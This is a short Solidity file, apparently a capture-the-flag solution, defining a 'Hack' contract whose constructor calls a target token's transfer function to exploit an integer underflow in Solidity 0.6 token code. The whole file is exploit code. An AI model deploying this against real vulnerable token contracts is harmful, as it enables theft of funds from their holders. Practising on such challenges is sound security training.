pragma solidity ^0.8;

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

// we can also declare IToken outside constructor incase Itoken is needed for other functions
// inside hack contract.

contract Hack {
    constructor(address _target) {
        // it uses the underflow and overflow vulnerabilty of solidity version 0.6
        IToken(_target).transfer(msg.sender, 1);
    }
}
